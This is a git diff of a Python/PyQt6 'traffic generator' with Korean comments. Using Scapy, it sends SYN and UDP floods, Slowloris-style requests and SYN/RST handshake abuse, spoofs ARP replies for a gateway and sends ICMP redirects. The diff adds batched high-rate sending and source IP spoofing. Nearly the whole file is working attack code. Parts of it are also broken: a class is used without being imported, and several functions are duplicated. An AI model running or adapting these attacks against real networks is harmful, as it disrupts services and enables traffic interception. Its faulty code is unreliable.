@@ -1,7 +1,7 @@
 # 필요한 모듈을 임포트.
 from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox, QComboBox
 from PyQt6.QtGui import QIcon
-from scapy.all import IP, TCP, UDP, send, ARP, ICMP
+from scapy.all import IP, TCP, UDP, send, sr1, ICMP, Ether, ARP, conf
 import threading
 import socket
 import random
@@ -12,56 +12,196 @@ import sys
 import os
 import json
 from PyQt6.QtCore import Qt
+import time
+import struct
 
 # 모듈 경로를 부모 디렉토리로 설정하기 위한 코드 추가
 current_dir = os.path.dirname(os.path.abspath(__file__))
 parent_dir = os.path.dirname(current_dir)  # components 디렉토리의 부모 (scripts)
 sys.path.append(parent_dir)
 
-#이하 기능들 전부  AI에이전트로 옮겨야함
+# Scapy 설정 (Wireshark에서 캡처가 잘 되도록)
+conf.verb = 0  # 상세 출력 비활성화
 
 # SYN 플러드 공격을 수행하는 함수.
-def syn_flood(target_ip, packet_count, packet_size, stop_flag):
-    for _ in range(packet_count):
+def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+    
+    # IP 스푸핑이 활성화된 경우 소스 IP 변경
+    if spoof_ip and is_valid_ip(spoof_ip):
+        src_ip = spoof_ip
+        print(f"IP 스푸핑 활성화: {spoof_ip}")
+
+    print(f"SYN 플러드 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
+    
+    # 패킷을 리스트에 모아서 한 번에 전송 (빠른 전송을 위함)
+    packets = []
+    for i in range(packet_count):
         if stop_flag.value:
             break
-        port = random.randint(1, 65535)
-        payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
-        packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/('X'*payload_size)
-        send(packet, inter=0.0001)
-        subprocess.run(f'echo SYN packet sent to {target_ip}:{port}', shell=True)
+        
+        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
+        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
+        payload_size = max(0, packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
+        
+        # 패킷 생성
+        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
+        packets.append(packet)
+        
+        # 일정 개수마다 전송 (메모리 부담 감소)
+        if len(packets) >= 1000 or i == packet_count-1:
+            try:
+                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
+                subprocess.run(f'echo {len(packets)}개 SYN 패킷 전송 ({i+1}/{packet_count})', shell=True)
+                packets = []  # 패킷 리스트 초기화
+            except Exception as e:
+                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
 
 # UDP 플러드 공격을 수행하는 함수.
-def udp_flood(target_ip, packet_count, packet_size, stop_flag):
-    for _ in range(packet_count):
+def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+    
+    # IP 스푸핑이 활성화된 경우 소스 IP 변경
+    if spoof_ip and is_valid_ip(spoof_ip):
+        src_ip = spoof_ip
+        print(f"IP 스푸핑 활성화: {spoof_ip}")
+
+    print(f"UDP 플러드 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
+    
+    # 패킷을 리스트에 모아서 한 번에 전송 (빠른 전송을 위함)
+    packets = []
+    for i in range(packet_count):
         if stop_flag.value:
             break
-        port = random.randint(1, 65535)
-        payload_size = packet_size - 20 - 8 - 14  # IP header (20 bytes) + UDP header (8 bytes) + Ethernet header (14 bytes)
-        packet = IP(dst=target_ip)/UDP(dport=port)/('X'*payload_size)
-        send(packet, inter=0.0001)
-        subprocess.run(f'echo UDP packet sent to {target_ip}:{port}', shell=True)
+        
+        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
+        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
+        payload_size = max(0, packet_size - 20 - 8 - 14)  # IP(20) + UDP(8) + Ethernet(14)
+        
+        # 패킷 생성
+        packet = IP(src=src_ip, dst=target_ip)/UDP(sport=sport, dport=dport)/Raw(load='X'*payload_size)
+        packets.append(packet)
+        
+        # 일정 개수마다 전송 (메모리 부담 감소)
+        if len(packets) >= 1000 or i == packet_count-1:
+            try:
+                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
+                subprocess.run(f'echo {len(packets)}개 UDP 패킷 전송 ({i+1}/{packet_count})', shell=True)
+                packets = []  # 패킷 리스트 초기화
+            except Exception as e:
+                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
 
 # HTTP Slowloris 공격을 수행하는 함수
-def http_slowloris(target_ip, packet_count, packet_size, stop_flag):
-    for _ in range(packet_count):
+def http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+
+    # IP 스푸핑이 활성화된 경우 소스 IP 변경
+    if spoof_ip and is_valid_ip(spoof_ip):
+        src_ip = spoof_ip
+        print(f"IP 스푸핑 활성화: {spoof_ip}")
+
+    print(f"HTTP Slowloris 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
+    
+    # HTTP 요청 헤더 생성
+    http_headers = [
+        "GET / HTTP/1.1",
+        f"Host: {target_ip}",
+        "User-Agent: Mozilla/5.0",
+        "Accept: text/html",
+        "Connection: keep-alive"
+    ]
+    
+    # 패킷을 리스트에 모아서 한 번에 전송
+    packets = []
+    for i in range(packet_count):
         if stop_flag.value:
             break
-        payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
-        packet = IP(dst=target_ip)/TCP(dport=80, flags='PA')/('X'*payload_size)
-        send(packet, inter=0.0001)
-        subprocess.run(f'echo HTTP Slowloris packet sent to {target_ip}:80', shell=True)
+        
+        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
+        
+        # 부분적인 HTTP 요청 생성 (완료되지 않는 요청)
+        headers = http_headers.copy()
+        # 패킷마다 다른 헤더 추가 (완료되지 않게)
+        headers.append(f"X-Header-{i}: {'X' * min(50, i % 100)}")
+        http_payload = "\r\n".join(headers)
+        
+        # 패킷 생성
+        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(load=http_payload)
+        packets.append(packet)
+        
+        # 일정 개수마다 전송 (메모리 부담 감소)
+        if len(packets) >= 1000 or i == packet_count-1:
+            try:
+                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
+                subprocess.run(f'echo {len(packets)}개 HTTP Slowloris 패킷 전송 ({i+1}/{packet_count})', shell=True)
+                packets = []  # 패킷 리스트 초기화
+            except Exception as e:
+                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
 
 # TCP 핸드셰이크 오용 공격을 수행하는 함수.
-def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag):
-    for _ in range(packet_count):
+def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+
+    # IP 스푸핑이 활성화된 경우 소스 IP 변경
+    if spoof_ip and is_valid_ip(spoof_ip):
+        src_ip = spoof_ip
+        print(f"IP 스푸핑 활성화: {spoof_ip}")
+
+    print(f"TCP 핸드셰이크 오용 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
+    
+    # 패킷을 리스트에 모아서 한 번에 전송
+    syn_packets = []
+    rst_packets = []
+    
+    for i in range(packet_count):
         if stop_flag.value:
             break
-        port = random.randint(1, 65535)
-        payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
-        packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/('X'*payload_size)
-        send(packet, inter=0.0001)
-        subprocess.run(f'echo TCP handshake misuse packet sent to {target_ip}:{port}', shell=True)
+        
+        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
+        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
+        payload_size = max(0, packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
+        
+        # SYN 패킷 생성
+        syn_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
+        syn_packets.append(syn_packet)
+        
+        # RST 패킷 생성 (핸드셰이크 중단)
+        rst_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='R')
+        rst_packets.append(rst_packet)
+        
+        # 일정 개수마다 전송 (메모리 부담 감소)
+        if len(syn_packets) >= 1000 or i == packet_count-1:
+            try:
+                # SYN 패킷 전송
+                send(syn_packets, iface=iface, verbose=0, inter=0, realtime=False)
+                subprocess.run(f'echo {len(syn_packets)}개 TCP SYN 패킷 전송 ({i+1}/{packet_count})', shell=True)
+                
+                # 약간의 지연 후 RST 패킷 전송
+                time.sleep(0.01)
+                send(rst_packets, iface=iface, verbose=0, inter=0, realtime=False)
+                subprocess.run(f'echo {len(rst_packets)}개 TCP RST 패킷 전송 ({i+1}/{packet_count})', shell=True)
+                
+                # 패킷 리스트 초기화
+                syn_packets = []
+                rst_packets = []
+            except Exception as e:
+                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
 
 # SSL/TLS 트래픽을 생성하는 함수.
 def ssl_traffic(target_ip, count, packet_size, stop_flag):
@@ -93,35 +233,177 @@ def http_request_modification(target_ip, packet_count, packet_size, stop_flag):
 
 # ARP 스푸핑 공격을 수행하는 함수.
 def arp_spoof(target_ip, spoof_ip, stop_flag):
+    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+
+    print(f"ARP 스푸핑 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 스푸핑 IP: {spoof_ip}")
+    
+    # 타겟의 MAC 주소 획득 시도
+    target_mac = None
+    try:
+        # ARP 요청을 보내 MAC 주소 확인 시도
+        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
+        response = sr1(arp_request, timeout=1, verbose=0, iface=iface)
+        if response:
+            target_mac = response.hwsrc
+        else:
+            target_mac = "ff:ff:ff:ff:ff:ff"  # 찾지 못한 경우 브로드캐스트 MAC 사용
+    except Exception as e:
+        print(f"타겟 MAC 주소 확인 중 오류: {str(e)}")
+        target_mac = "ff:ff:ff:ff:ff:ff"  # 오류 발생 시 브로드캐스트 MAC 사용
+    
+    # ARP 스푸핑 패킷 생성 (여러 개를 미리 생성)
+    arp_packets = []
+    for i in range(100):  # 100개의 패킷을 미리 생성
+        arp_response = ARP(op="is-at", 
+                          psrc=spoof_ip,  # 스푸핑할 IP (대개 게이트웨이)
+                          pdst=target_ip,  # 타겟 IP
+                          hwdst=target_mac,  # 타겟 MAC
+                          hwsrc=Ether().src)  # 자신의 MAC
+        arp_packets.append(arp_response)
+    
+    # 패킷 카운터
+    count = 0
+    
+    # 연속 스푸핑 시작
     while not stop_flag.value:
-        # ARP 패킷 생성
-        # 목적지 MAC 주소를 명시적으로 설정
-        arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, op='is-at')
-        send(arp_response, verbose=False)
-        subprocess.run(f'echo ARP spoofing packet sent to {target_ip}', shell=True)
+        try:
+            # 미리 생성한 패킷들을 빠르게 전송
+            send(arp_packets, iface=iface, verbose=0, inter=0)
+            count += len(arp_packets)
+            subprocess.run(f'echo ARP 스푸핑 패킷 {count}개 전송됨', shell=True)
+            
+            # 약간의 지연 (ARP 캐시 갱신 주기보다 짧게)
+            time.sleep(0.5)
+        except Exception as e:
+            subprocess.run(f'echo ARP 패킷 전송 중 오류: {str(e)}', shell=True)
+            time.sleep(1.0)  # 오류 발생 시 좀 더 긴 지연
 
 # ICMP 리다이렉트 공격을 수행하는 함수.
 def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
+    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+
+    print(f"사용 인터페이스: {iface}, 소스 IP: {src_ip}")
+    
+    # 원래 게이트웨이 IP 확인 (실제 게이트웨이 주소를 사용하도록)
+    gateway_ip = get_default_gateway() or "192.168.1.1"
+    
+    count = 0
     while not stop_flag.value:
-        # ICMP 리다이렉트 패킷 생성
-        icmp_redirect_packet = IP(dst=target_ip)/ICMP(type=5, code=1, gw=new_gateway_ip)
-        send(icmp_redirect_packet, verbose=False)
-        subprocess.run(f'echo ICMP redirect packet sent to {target_ip}', shell=True)
+        count += 1
+        try:
+            # Scapy를 사용하여 ICMP 리다이렉트 패킷 생성
+            redirect_packet = IP(src=gateway_ip, dst=target_ip)/ICMP(
+                type=5,  # 리다이렉트
+                code=1,  # 호스트에 대한 리다이렉트
+                gw=new_gateway_ip)/IP(src=target_ip, dst="8.8.8.8")
+            
+            # 패킷 전송
+            send(redirect_packet, iface=iface, verbose=0)
+            subprocess.run(f'echo ICMP redirect packet #{count} sent to {target_ip} via Scapy (new gateway: {new_gateway_ip})', shell=True)
+            
+            # 리다이렉트도 주기적으로 반복
+            time.sleep(1.0)
+            
+        except Exception as e:
+            subprocess.run(f'echo Error sending ICMP redirect packet: {str(e)}', shell=True)
+            time.sleep(1.0)  # 오류 발생 시 더 긴 지연
 
-def standalone_syn_flood(target_ip, packet_count, packet_size, stop_flag):
-    syn_flood(target_ip, packet_count, packet_size, stop_flag)
+# 네트워크 인터페이스와 IP 가져오는 유틸리티 함수
+def get_default_iface_and_ip():
+    try:
+        # Windows에서 기본 네트워크 인터페이스 찾기
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            # Google DNS에 연결하여 사용 중인 인터페이스/IP 확인
+            s.connect(("8.8.8.8", 80))
+            src_ip = s.getsockname()[0]
+            s.close()
+            
+            # Scapy의 conf.iface 사용
+            iface = conf.iface
+            print(f"Scapy 기본 인터페이스: {iface}, IP: {src_ip}")
+            return iface, src_ip
+            
+        except socket.error:
+            print("네트워크 연결을 확인할 수 없습니다.")
+            s.close()
+    except Exception as e:
+        print(f"인터페이스 확인 중 오류: {str(e)}")
+    
+    # 실패 시 localhost로 폴백
+    return conf.loopback_name, "127.0.0.1"
+
+# 기본 게이트웨이 주소를 확인하는 함수
+def get_default_gateway():
+    try:
+        # Scapy에서 기본 라우트 정보 가져오기
+        for net, msk, gw, iface, addr, metric in conf.route.routes:
+            if net == 0 and msk == 0:  # 기본 라우트
+                return gw
+    except:
+        pass
+    
+    # 실패 시 None 반환
+    return None
+
+# IP 주소의 유효성을 검사하는 함수
+def is_valid_ip(ip):
+    # IP 주소 유효성 검사
+    try:
+        socket.inet_pton(socket.AF_INET, ip)
+        return True
+    except socket.error:
+        return False
+
+def test_packet_send(target_ip="127.0.0.1", method="scapy"):
+    """패킷 전송 테스트 함수"""
+    print(f"패킷 전송 테스트 시작 ({method} 사용)")
+    
+    try:
+        if method == "socket":
+            # 일반 소켓 사용
+            import socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(b"TEST", (target_ip, 12345))
+            s.close()
+            print("소켓 테스트 완료")
+            return True
+            
+        elif method == "scapy":
+            # Scapy 사용
+            iface = conf.iface  # Scapy 기본 인터페이스 사용
+            print(f"Scapy 사용 인터페이스: {iface}")
+            packet = IP(dst=target_ip)/UDP(dport=12345)/b"TEST"
+            send(packet, iface=iface, verbose=1)  # verbose=1로 설정하여 전송 정보 표시
+            print("Scapy 테스트 완료")
+            return True
+    except Exception as e:
+        print(f"패킷 전송 테스트 오류: {str(e)}")
+        return False
+
+def standalone_syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip)
 
 
-def standalone_udp_flood(target_ip, packet_count, packet_size, stop_flag):
-    udp_flood(target_ip, packet_count, packet_size, stop_flag)
+def standalone_udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip)
 
 
-def standalone_http_slowloris(target_ip, packet_count, packet_size, stop_flag):
-    http_slowloris(target_ip, packet_count, packet_size, stop_flag)
+def standalone_http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip)
 
 
-def standalone_tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag):
-    tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag)
+def standalone_tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip)
 
 
 def standalone_ssl_traffic(target_ip, packet_count, packet_size, stop_flag):
@@ -160,10 +442,30 @@ class TrafficGeneratorApp(QWidget):
         # IP 입력 필드를 설정.
         ip_label = QLabel("대상 IP:")
         self.ip_input = QLineEdit()
+        # 기본값으로 localhost 설정 (테스트 용도)
+        self.ip_input.setText("127.0.0.1")
         top_layout.addWidget(ip_label)
         top_layout.addWidget(self.ip_input)
 
         layout.addLayout(top_layout)
+
+        # IP 스푸핑 설정 추가
+        spoof_layout = QHBoxLayout()
+        self.spoof_ip_checkbox = QCheckBox("IP 스푸핑 사용")
+        self.spoof_ip_input = QLineEdit()
+        self.spoof_ip_input.setPlaceholderText("스푸핑할 소스 IP 주소 입력")
+        self.spoof_ip_input.setEnabled(False)
+        self.spoof_ip_checkbox.stateChanged.connect(self.toggle_spoof_ip)
+        spoof_layout.addWidget(self.spoof_ip_checkbox)
+        spoof_layout.addWidget(self.spoof_ip_input)
+        layout.addLayout(spoof_layout)
+        
+        # 패킷 전송 테스트 버튼 추가
+        test_layout = QHBoxLayout()
+        test_button = QPushButton("패킷 전송 테스트")
+        test_button.clicked.connect(self.test_packet_transmission)
+        test_layout.addWidget(test_button)
+        layout.addLayout(test_layout)
 
         # 기본 프리셋 추가
         self.presets = {
@@ -322,27 +624,40 @@ class TrafficGeneratorApp(QWidget):
         target_ip = self.ip_input.text().strip()
         packet_count = int(self.packet_count_input.text())
         packet_size = self.get_packet_size()  # 패킷 크기 가져오기
+        
+        # IP 스푸핑 설정 확인
+        spoof_ip = None
+        if self.spoof_ip_checkbox.isChecked():
+            spoof_ip = self.spoof_ip_input.text().strip()
+            if not is_valid_ip(spoof_ip):
+                QMessageBox.warning(self, "잘못된 스푸핑 IP", "올바른 스푸핑 IP 주소를 입력하세요.")
+                return
+        
         if self.is_valid_ip(target_ip):
-            QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")
+            if spoof_ip:
+                QMessageBox.information(self, "트래픽 생성", f"트래픽 생성이 시작됩니다. 소스 IP가 {spoof_ip}로 변조됩니다.")
+            else:
+                QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")
+            
             self.cmd_process = subprocess.Popen("start cmd /k echo 트래픽 생성 중...", shell=True)
 
             attack_methods = []
             if self.syn_flood_checkbox.isChecked():
-                attack_methods.append((standalone_syn_flood, (target_ip, packet_count, packet_size, self.stop_flag)))
+                attack_methods.append((standalone_syn_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
             if self.udp_flood_checkbox.isChecked():
-                attack_methods.append((standalone_udp_flood, (target_ip, packet_count, packet_size, self.stop_flag)))
+                attack_methods.append((standalone_udp_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
             if self.http_slowloris_checkbox.isChecked():
-                attack_methods.append((standalone_http_slowloris, (target_ip, packet_count, packet_size, self.stop_flag)))
+                attack_methods.append((standalone_http_slowloris, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
             if self.tcp_handshake_misuse_checkbox.isChecked():
-                attack_methods.append((standalone_tcp_handshake_misuse, (target_ip, packet_count, packet_size, self.stop_flag)))
+                attack_methods.append((standalone_tcp_handshake_misuse, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
             if self.ssl_traffic_checkbox.isChecked():
                 attack_methods.append((standalone_ssl_traffic, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.http_request_modification_checkbox.isChecked():
                 attack_methods.append((standalone_http_request_modification, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.arp_spoofing_checkbox.isChecked():
-                # ARP 스푸핑을 위한 추가 입력 필요
-                spoof_ip = "192.168.1.1"  # 예시 IP, 실제로는 사용자 입력 필요
-                attack_methods.append((standalone_arp_spoof, (target_ip, spoof_ip, self.stop_flag)))
+                # 스푸핑할 IP로는 spoof_ip를 사용하거나, 없는 경우 기본값 사용
+                spoof_gateway_ip = spoof_ip if spoof_ip else "192.168.1.1"
+                attack_methods.append((standalone_arp_spoof, (target_ip, spoof_gateway_ip, self.stop_flag)))
             if self.icmp_redirect_checkbox.isChecked():
                 # ICMP 리다이렉트를 위한 추가 입력 필요
                 new_gateway_ip = "192.168.1.254"  # 예시 IP, 실제로는 사용자 입력 필요
@@ -352,14 +667,18 @@ class TrafficGeneratorApp(QWidget):
                 process = Process(target=method, args=args)
                 process.start()
                 self.processes.append(process)
-            print(f"패킷이 {target_ip}로 전송되었습니다.")
+            
+            if spoof_ip:
+                print(f"패킷이 {target_ip}로 전송되었습니다. (소스 IP: {spoof_ip} - 변조됨)")
+            else:
+                print(f"패킷이 {target_ip}로 전송되었습니다.")
         else:
             QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
             self.ip_input.clear()
 
     # IP 주소의 유효성을 검사하는 메서드.
     def is_valid_ip(self, ip):
-        # IP 주소 유효성 검사 강화
+        # IP 주소 유효성 검사
         try:
             socket.inet_pton(socket.AF_INET, ip)
             return True
@@ -422,3 +741,128 @@ class TrafficGeneratorApp(QWidget):
         elif self.large_packet_size_checkbox.isChecked():
             return 9000  # 예시로 큰 패킷 크기 설정
         return 1514  # 기본값 
+
+    def toggle_spoof_ip(self):
+        """IP 스푸핑 체크박스 상태에 따라 IP 입력 필드 활성화/비활성화"""
+        self.spoof_ip_input.setEnabled(self.spoof_ip_checkbox.isChecked())
+        if not self.spoof_ip_checkbox.isChecked():
+            self.spoof_ip_input.clear()
+
+    def test_packet_transmission(self):
+        """패킷 전송 테스트 함수"""
+        target_ip = self.ip_input.text().strip()
+        if not self.is_valid_ip(target_ip):
+            QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
+            return
+            
+        # 세 가지 방법으로 테스트
+        socket_test = test_packet_send(target_ip, "socket")
+        raw_test = test_packet_send(target_ip, "raw")
+        scapy_test = test_packet_send(target_ip, "scapy")
+        
+        result = "패킷 전송 테스트 결과:\n"
+        result += f"일반 소켓: {'성공' if socket_test else '실패'}\n"
+        result += f"Raw 소켓: {'성공' if raw_test else '실패'}\n"
+        result += f"Scapy: {'성공' if scapy_test else '실패'}\n"
+        
+        if socket_test or raw_test or scapy_test:
+            result += "\n최소한 하나의 방법이 작동합니다. 패킷 전송이 가능합니다."
+            QMessageBox.information(self, "테스트 결과", result)
+        else:
+            result += "\n모든 방법이 실패했습니다. 관리자 권한 확인이 필요합니다."
+            QMessageBox.critical(self, "테스트 실패", result)
+    
+    def toggle_spoof_ip(self):
+        """IP 스푸핑 체크박스 상태에 따라 IP 입력 필드 활성화/비활성화"""
+        self.spoof_ip_input.setEnabled(self.spoof_ip_checkbox.isChecked())
+        if not self.spoof_ip_checkbox.isChecked():
+            self.spoof_ip_input.clear()
+
+    # 트래픽을 생성하고 전송하는 메서드.
+    def generate_traffic(self):
+        if not self.is_admin():
+            QMessageBox.critical(self, "권한 오류", "관리자 권한이 필요합니다.")
+            self.request_admin_privileges()
+            return
+
+        self.stop_flag.value = False  # 중단 플래그 초기화
+        target_ip = self.ip_input.text().strip()
+        packet_count = int(self.packet_count_input.text())
+        packet_size = self.get_packet_size()  # 패킷 크기 가져오기
+        
+        # IP 스푸핑 설정 확인
+        spoof_ip = None
+        if self.spoof_ip_checkbox.isChecked():
+            spoof_ip = self.spoof_ip_input.text().strip()
+            if not is_valid_ip(spoof_ip):
+                QMessageBox.warning(self, "잘못된 스푸핑 IP", "올바른 스푸핑 IP 주소를 입력하세요.")
+                return
+        
+        if self.is_valid_ip(target_ip):
+            if spoof_ip:
+                QMessageBox.information(self, "트래픽 생성", f"트래픽 생성이 시작됩니다. 소스 IP가 {spoof_ip}로 변조됩니다.")
+            else:
+                QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")
+            
+            self.cmd_process = subprocess.Popen("start cmd /k echo 트래픽 생성 중...", shell=True)
+
+            attack_methods = []
+            if self.syn_flood_checkbox.isChecked():
+                attack_methods.append((standalone_syn_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
+            if self.udp_flood_checkbox.isChecked():
+                attack_methods.append((standalone_udp_flood, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
+            if self.http_slowloris_checkbox.isChecked():
+                attack_methods.append((standalone_http_slowloris, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
+            if self.tcp_handshake_misuse_checkbox.isChecked():
+                attack_methods.append((standalone_tcp_handshake_misuse, (target_ip, packet_count, packet_size, self.stop_flag, spoof_ip)))
+            if self.ssl_traffic_checkbox.isChecked():
+                attack_methods.append((standalone_ssl_traffic, (target_ip, packet_count, packet_size, self.stop_flag)))
+            if self.http_request_modification_checkbox.isChecked():
+                attack_methods.append((standalone_http_request_modification, (target_ip, packet_count, packet_size, self.stop_flag)))
+            if self.arp_spoofing_checkbox.isChecked():
+                # 스푸핑할 IP로는 spoof_ip를 사용하거나, 없는 경우 기본값 사용
+                spoof_gateway_ip = spoof_ip if spoof_ip else "192.168.1.1"
+                attack_methods.append((standalone_arp_spoof, (target_ip, spoof_gateway_ip, self.stop_flag)))
+            if self.icmp_redirect_checkbox.isChecked():
+                # ICMP 리다이렉트를 위한 추가 입력 필요
+                new_gateway_ip = "192.168.1.254"  # 예시 IP, 실제로는 사용자 입력 필요
+                attack_methods.append((standalone_icmp_redirect, (target_ip, new_gateway_ip, self.stop_flag)))
+
+            for method, args in attack_methods:
+                process = Process(target=method, args=args)
+                process.start()
+                self.processes.append(process)
+            
+            if spoof_ip:
+                print(f"패킷이 {target_ip}로 전송되었습니다. (소스 IP: {spoof_ip} - 변조됨)")
+            else:
+                print(f"패킷이 {target_ip}로 전송되었습니다.")
+        else:
+            QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
+            self.ip_input.clear()
+
+def test_packet_send(target_ip="127.0.0.1", method="scapy"):
+    """패킷 전송 테스트 함수"""
+    print(f"패킷 전송 테스트 시작 ({method} 사용)")
+    
+    try:
+        if method == "socket":
+            # 일반 소켓 사용
+            import socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(b"TEST", (target_ip, 12345))
+            s.close()
+            print("소켓 테스트 완료")
+            return True
+            
+        elif method == "scapy":
+            # Scapy 사용
+            iface = conf.iface  # Scapy 기본 인터페이스 사용
+            print(f"Scapy 사용 인터페이스: {iface}")
+            packet = IP(dst=target_ip)/UDP(dport=12345)/b"TEST"
+            send(packet, iface=iface, verbose=1)  # verbose=1로 설정하여 전송 정보 표시
+            print("Scapy 테스트 완료")
+            return True
+    except Exception as e:
+        print(f"패킷 전송 테스트 오류: {str(e)}")
+        return False 
